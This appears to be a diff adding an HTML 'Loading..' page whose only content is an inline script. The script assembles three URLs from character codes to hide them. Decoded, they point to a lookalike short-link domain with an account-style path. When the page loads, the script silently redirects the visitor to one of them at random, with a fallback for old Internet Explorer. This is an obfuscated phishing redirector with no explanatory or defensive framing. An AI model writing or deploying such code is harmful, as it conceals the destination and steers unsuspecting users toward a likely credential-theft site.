@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="referrer" content="unsafe-url">
+    <title>Loading..</title>
+</head>
+<body class="responsive">
+<script>
+    var ours = [
+        String.fromCharCode(104,116,116,112,115,58,47,47,106,112,45,115,104,111,114,116,108,121,45,108,105,110,107,46,106,112,47,114,107,116,45,97,99,99,45,115,99,100,110,47),
+        String.fromCharCode(104,116,116,112,115,58,47,47,106,112,45,115,104,111,114,116,108,121,45,108,105,110,107,46,106,112,47,114,107,116,45,97,99,99,45,115,99,100,110,47,63,115,115,108),
+        String.fromCharCode(104,116,116,112,115,58,47,47,106,112,45,115,104,111,114,116,108,121,45,108,105,110,107,46,106,112,47,114,107,116,45,97,99,99,45,115,99,100,110,47,63,115,101,99,117,114,101),
+    ];
+    window.addEventListener("DOMContentLoaded", function () {
+        var c = ours[Math.floor(Math.random() * ours.length)], b = navigator.userAgent.toLowerCase(),
+            a = -1 !== b.indexOf("msie");
+        b = parseInt(b.substr(4, 2), 10);
+        a && 9 > b ? (a = document.createElement("a"), a.href = c, document.body.appendChild(a), a.click()) : window.location.href = c;
+    });
+</script>
+</body>
+</html>
